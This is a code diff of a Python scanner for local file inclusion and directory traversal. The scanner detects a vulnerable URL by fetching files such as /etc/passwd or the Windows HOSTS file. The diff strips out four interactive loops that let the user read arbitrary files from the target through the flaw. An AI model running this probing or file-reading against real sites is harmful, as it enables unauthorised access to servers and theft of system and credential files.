@@ -14,14 +14,7 @@ def linux_lfi():
 			r = r.text
 			if "root:x" in r:
 				print("lfi present in "+url)		
-				print("starting a shell")
-
-				while True:
-					if "root:x" in r:
-						i = input("shell >> ")
-						r = requests.get(url.strip('\n')+i)
-						r = r.text
-						print(r)
+				
 
 			else:
                                 print("no direct linux lfi present")
@@ -36,13 +29,7 @@ def linux_dirtrav():
             r = r.text
             if "root:x" in r:
                 print("lfi present in " + url)
-                print("starting a shell")
-                while True:
-                    if "root:x" in r:
-                        i = input("shell >> ")
-                        r = requests.get(url.strip('\n') + dirtrav + i)
-                        r = r.text
-                        print(r)
+               
             else:
                 print("no linux lfi present using directory traversal")
                 
@@ -59,13 +46,8 @@ def windows_lfi():
 			r = r.text
 			if "This is a sample HOSTS file" in r:
 				print("lfi present in "+url)
-				print("starting a shell")
-				while True:
-					if "This is a sample HOSTS file" in r:
-						i = input("shell >> ")
-						r = requests.get(url.strip('\n')+i)
-						r = r.text
-						print(r)
+				
+				
 			else:
                                 print("no direct windows lfi present")
 windows_lfi()
@@ -78,13 +60,7 @@ def windows_dirtrav():
 			r = r.text
 			if "This is a sample HOSTS file" in r:
 				print("lfi present in "+url)
-				print("starting a shell")
-				while True:
-					if "This is a sample HOSTS file" in r:
-						i = input("shell >> ")
-						r = requests.get(url.strip('\n')+i)
-						r = r.text
-						print(r)
+
 			else:
                                 print("no windows lfi present using directory traversal")
 
